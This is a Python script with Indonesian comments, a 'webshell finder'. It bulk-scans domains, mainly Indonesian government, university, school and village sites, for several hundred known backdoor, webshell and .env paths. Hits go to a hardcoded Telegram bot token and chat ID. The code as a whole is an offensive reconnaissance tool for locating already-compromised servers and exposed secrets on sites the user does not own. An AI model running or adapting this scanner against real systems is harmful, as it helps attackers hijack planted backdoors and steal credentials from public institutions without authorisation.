import requests
from bs4 import BeautifulSoup
import random
import time
import threading
from queue import Queue
from colorama import Fore, Style, init
import telebot

# ========== KONFIGURASI ==========
TELEGRAM_BOT_TOKEN = "8125490761:AAHlryc6Ch6AJDw2T-lhuoCeB8LvKkJyL80"  # Ganti dengan token bot Telegram
TELEGRAM_CHAT_ID = "1695222299"      # Ganti dengan chat ID tujuan
THREAD_COUNT = 20                      # Jumlah thread (5-40)
REQUEST_TIMEOUT = 10
SLEEP_BETWEEN_REQUESTS = 0.5
RESULTS_FILE = "webshell_results.txt"
DOMAINS_FILE = "domains.txt"           # File berisi list domain (satu per baris)

# TLD target
TARGET_TLDS = [".go.id", ".ac.id", ".sch.id", ".desa.id"]

# Path webshell (disingkat agar tidak terlalu panjang)
SHELL_PATHS = [
    "/wp-content/themes/gaukingo/db.php",
    "/wp-includes/wp-class.php",
    "/wp-cron.php?ac=3",
    "/alfa-rex.php7",
    "/dropdown.php",
    "/chosen.php?p=",
    "/ws.php",
    "/.well-known/wp-cron.php?ac=3",
    "/fm1.php",
    "/wso.php",
    "/images/Mhbgf.php",
    "/administrator/",
    "/admin/",
    "/wp-admin/",
    "/upload/",
    "/images/",
    "/index.php",
    "/includes/db.php",
    "/themes/db.php",
    "/css/upload.php",
    "/js/upload.php",
    "/backup/db.php",
    "/sql.php",
    "/shell.php",
    "/config.php",
    "/install.php",
    "/.env",
    "/vendor/.env",
    "/wp-content/uploads/db.php",
    "/wp-includes/widgets/class-wp-widget-categories-character.php", 
    "/wp-includes/class-wp-hook-ajax-response.php", "/shell.php", 
    "/backdoor.php", "/webshell.php", "/cmd.php", "/upload.php", "/exec.php", 
    "/reverse.php", "/adminer.php", "/panel.php", "/deface.php", "/index.php", 
    "/test.php", "/cmd2.php", "/backdoor2.php", "/webbackdoor.php", "/spider.php", 
    "/panelbackdoor.php", "/r57.php", "/c99.php", "/b374k.php", "/pussy.php", 
    "/hacked.php", "/php-reverse-shell.php", "/sh.php", "/mini.php", "/config.php", 
    "/gate.php", "/root.php", "/priv.php", "/access.php", "/shell2.php", "/upl.php", 
    "/load.php", "/system.php", "/connect.php", "/hidden.php", "/stealth.php", 
    "/safe.php", "/error.php", "/pass.php", "/xploit.php", "/bypass.php", "/scan.php", 
    "/inject.php", "/debug.php", "/ghost.php", "/shadow.php", "/proxy.php", "/rootkit.php", 
    "/stealthshell.php", "/ghostshell.php", "/server.php", "/hidden_access.php", 
    "/bypass_auth.php", "/webadmin.php", "/control.php", "/security_breach.php", 
    "/hacktool.php", "/door.php", "/exploit.php", "/anonaccess.php", "/undetected.php", 
    "/command.php", "/gateway.php", "/connection.php", "/remote.php", "/upload_bypass.php", 
    "/terminal.php", "/malicious.php", "/forbidden.php", "/override.php", "/superuser.php", 
    "/intruder.php", "/master.php", "/king.php", "/admin_shell.php", "/server_control.php", 
    "/security_bypass.php", "/hidden_door.php", "/anon_shell.php", "/webmaster.php", 
    "/cmdshell.php", "/supercmd.php", "/php_shell.php", "/backconnect.php", "/connect_back.php", 
    "/revshell.php", "/socket.php", "/tcp_shell.php", "/udp_shell.php", "/bind.php", 
    "/rootdoor.php", "/undetectable.php", "/secure.php", "/fake_login.php", 
    "/php-backdoor.php", "/shell_access.php", "/hidden_script.php", "/safe_mode_bypass.php", 
    "/shell_exec.php", "/reverse_tcp.php", "/remote_access.php", "/ftp_shell.php", 
    "/mysql_shell.php", "/database_shell.php", "/php_webshell.php", "/injector.php", 
    "/php-exploit.php", "/anonhack.php", "/supershell.php", "/ssh_bypass.php", 
    "/c99shell.php", "/r57shell.php", "/r00tshell.php", "/1337shell.php", "/elite.php", 
    "/underground.php", "/trojan.php", "/botnet.php", "/payload.php", "/meterpreter.php", 
    "/rat.php", "/webshell_access.php", "/system_control.php", "/server_root.php", 
    "/admin_cmd.php", "/privilege_escalation.php", "/hidden_service.php", 
    "/anonymous_shell.php", "/remote_cmd.php", "/reverse_access.php", "/bypass_login.php", 
    "/exploit_cmd.php", "/ghost_access.php", "/hidden_gateway.php", "/proxy_bypass.php", 
    "/server_bypass.php", "/rootkit_access.php", "/bypass_root.php", "/root_command.php", 
    "/admin_exploit.php", "/stealth_backdoor.php", "/hacker_access.php", "/anonymous_cmd.php", 
    "/terminal_access.php", "/database_exploit.php", "/php_hidden.php", "/super_admin.php", 
    "/shadow_root.php", "/safe_access.php", "/server_exploit.php", "/hidden_root.php", 
    "/undetectable_shell.php", "/ghost_command.php", "/master_shell.php", "/elite_cmd.php", 
    "/proxy_exploit.php", "/bypass_firewall.php", "/backdoor_access.php", "/root_access.php", 
    "/hacker_panel.php", "/webshell_hidden.php", "/server_cmd.php", "/exploit_root.php", 
    "/php_control.php", "/webmaster_shell.php", "/webshell_bypass.php", "/admin_privileges.php", 
    "/root_server.php", "/webmaster_access.php", "/hidden_panel.php", "/server_inject.php", 
    "/remote_shell_exec.php", "/undetectable_script.php", "/mysql_exploit.php", 
    "/ftp_exploit.php", "/smtp_shell.php", "/telnet_shell.php", "/email_exploit.php", 
    "/apache_exploit.php", "/nginx_exploit.php", "/iis_exploit.php", "/htaccess_bypass.php", 
    "/mod_rewrite_bypass.php", "/hidden_php.php", "/hidden_exploit.php", "/hidden_admin.php", 
    "/stealth_exploit.php", "/elite_shell.php", "/supreme_backdoor.php", "/server_tunnel.php", 
    "/proxy_tunnel.php", "/database_tunnel.php", "/server_rootkit.php", 
    "/php_backdoor_script.php", "/undetectable_payload.php", "/webshell_inject.php", 
    "/firewall_bypass.php", "/malicious_access.php", "/hidden_server.php", 
    "/server_injector.php", "/remote_server.php", "/php_server_exploit.php", 
    "/database_access.php", "/malware_shell.php", "/hacker_exploit.php", "/anonymous_root.php", 
    "/bypass_privileges.php", "/database_root.php", "/system_bypass.php", "/server_hacker.php", 
    "/rootkit_exploit.php", "/superuser_access.php", "/hacker_rootkit.php", "/system_admin.php", 
    "/privileged_shell.php", "/superuser_exploit.php", "/anonymous_exploit.php", 
    "/database_hack.php", "/server_trojan.php", "/anonymous_admin.php", "/ftp_root.php", 
    "/ssh_root.php", "/email_root.php", "/telnet_root.php", "/server_rootkit_bypass.php", 
    "/backdoor_cmd.php", "/rootkit_admin.php", "/system_tunnel.php", "/anonymous_tunnel.php", 
    "/server_breach.php", "/database_trojan.php", "/webshell_tunnel.php", "/php_tunnel.php", 
    "/undetectable_backdoor.php", "/malicious_rootkit.php", "/superuser_bypass.php", 
    "/system_rootkit.php", "/admin_rootkit.php", "/rootkit_server.php", "/php_system.php", 
    "/server_rootkit_exploit.php", "/bypass_access.php", "/hidden_bypass.php", 
    "/server_hijack.php", "/rootkit_bypass_access.php", "/stealth_hacker.php", 
    "/hacker_hidden.php", "/server_exploit_bypass.php", "/server_root_bypass.php", 
    "/php_root_bypass.php", "/webshell_admin.php", "/superuser_panel.php", "/rootkit_control.php", 
    "/stealth_root.php", "/anonymous_panel.php", "/server_command.php", "/superuser_command.php", 
    "/server_root_access.php", "/privilege_root.php", "/admin_root_bypass.php", 
    "/server_rootkit_access.php", "/stealth_exploit_access.php", "/malicious_exploit.php"
]

# Inisialisasi
init()
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN) if TELEGRAM_BOT_TOKEN else None
lock = threading.Lock()
found_shells = []
scanned_domains = set()

# ========== FUNGSI UTAMA ==========
def load_domains_from_file(filename):
    """Muat list domain dari file"""
    domains = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    domains.append(line)
        print(Fore.GREEN + f"[+] Loaded {len(domains)} domains from {filename}" + Style.RESET_ALL)
    except FileNotFoundError:
        print(Fore.RED + f"[!] File {filename} tidak ditemukan!" + Style.RESET_ALL)
    return domains

def send_telegram(message):
    """Kirim notifikasi ke Telegram"""
    if bot:
        try:
            bot.send_message(TELEGRAM_CHAT_ID, message, parse_mode='HTML')
        except Exception as e:
            print(Fore.RED + f"[!] Telegram Error: {e}" + Style.RESET_ALL)

def save_result(url):
    """Simpan hasil ke file"""
    with lock:
        with open(RESULTS_FILE, 'a') as f:
            f.write(url + '\n')
        found_shells.append(url)

def check_webshell(base_url, path):
    """Cek apakah path webshell ada"""
    try:
        url = base_url.rstrip("/") + path
        response = requests.head(url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
        if response.status_code == 200:
            # Cek tambahan dengan GET untuk konfirmasi
            get_resp = requests.get(url, timeout=REQUEST_TIMEOUT)
            if get_resp.status_code == 200 and len(get_resp.text) > 100:  # Filter halaman kosong
                msg = f"✅ <b>WEBSHELL DITEMUKAN!</b>\n{url}"
                print(Fore.GREEN + f"[✓] {url}" + Style.RESET_ALL)
                save_result(url)
                send_telegram(msg)
                return True
        return False
    except Exception as e:
        return False

def get_random_links(url):
    """Ambil link dari halaman untuk crawling"""
    links = []
    try:
        response = requests.get(url, timeout=REQUEST_TIMEOUT)
        soup = BeautifulSoup(response.text, 'html.parser')
        for a in soup.find_all('a', href=True):
            href = a['href']
            if any(tld in href for tld in TARGET_TLDS):
                if href.startswith('http'):
                    links.append(href)
                elif href.startswith('/'):
                    links.append(url.rstrip('/') + href)
    except:
        pass
    return random.sample(links, min(len(links), 3)) if links else []

def scan_domain(domain):
    """Scan satu domain"""
    domain = domain.strip()
    if not domain.startswith('http'):
        domain = 'https://' + domain
    
    with lock:
        if domain in scanned_domains:
            return
        scanned_domains.add(domain)
    
    print(Fore.CYAN + f"[~] Scanning: {domain}" + Style.RESET_ALL)
    
    # Cek setiap path webshell
    for path in SHELL_PATHS:
        check_webshell(domain, path)
        time.sleep(SLEEP_BETWEEN_REQUESTS)
    
    # Crawl untuk dapatkan link internal
    try:
        new_links = get_random_links(domain)
        for link in new_links:
            if link not in scanned_domains:
                for path in random.sample(SHELL_PATHS, 10):  # Cek 10 path random saja
                    check_webshell(link, path)
                    time.sleep(SLEEP_BETWEEN_REQUESTS)
    except:
        pass

def worker(queue):
    """Worker untuk thread"""
    while True:
        try:
            domain = queue.get(timeout=5)
            scan_domain(domain)
        except:
            break

def bulk_scan(domains):
    """Scan bulk dengan multi-threading"""
    queue = Queue()
    
    # Masukkan domain ke queue
    for domain in domains:
        queue.put(domain)
    
    # Buat thread
    threads = []
    for _ in range(min(THREAD_COUNT, len(domains))):
        t = threading.Thread(target=worker, args=(queue,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Tunggu semua selesai
    queue.join()
    
    # Tunggu thread selesai
    for t in threads:
        t.join(timeout=2)

# ========== MAIN ==========
if __name__ == "__main__":
    print(Fore.CYAN + """
    ╔══════════════════════════════════════╗
    ║    WEBSHELL FINDER v2.0              ║
    ║    + Telegram Bot                    ║
    ║    + Multi-threading ({} threads)    ║
    ║    + Bulk scan from file             ║
    ╚══════════════════════════════════════╝
    """.format(THREAD_COUNT) + Style.RESET_ALL)
    
    # Load domain dari file
    domains = load_domains_from_file(DOMAINS_FILE)
    
    if not domains:
        print(Fore.YELLOW + "[!] Tidak ada domain untuk discan. Buat file domains.txt terlebih dahulu." + Style.RESET_ALL)
        exit()
    
    # Kirim notifikasi mulai scan
    send_telegram(f"🔍 <b>Webshell Scan Started</b>\nDomains: {len(domains)}\nThreads: {THREAD_COUNT}")
    
    # Mulai scan
    start_time = time.time()
    bulk_scan(domains)
    
    # Selesai
    elapsed = time.time() - start_time
    summary = f"""
    ╔══════════════════════════════════════╗
    ║           SCAN COMPLETE              ║
    ╠══════════════════════════════════════╣
    ║ Domains scanned: {len(domains):<20} ║
    ║ Shells found   : {len(found_shells):<20} ║
    ║ Time elapsed   : {elapsed:.2f}s          ║
    ║ Results saved  : {RESULTS_FILE:<10} ║
    ╚══════════════════════════════════════╝
    """
    
    print(Fore.CYAN + summary + Style.RESET_ALL)
    
    # Kirim notifikasi selesai
    if found_shells:
        send_telegram(f"✅ <b>Scan Selesai!</b>\nDitemukan {len(found_shells)} webshell.\nLihat {RESULTS_FILE}")
    else:
        send_telegram(f"📭 <b>Scan Selesai!</b>\nTidak ditemukan webshell.\nDomain discan: {len(domains)}")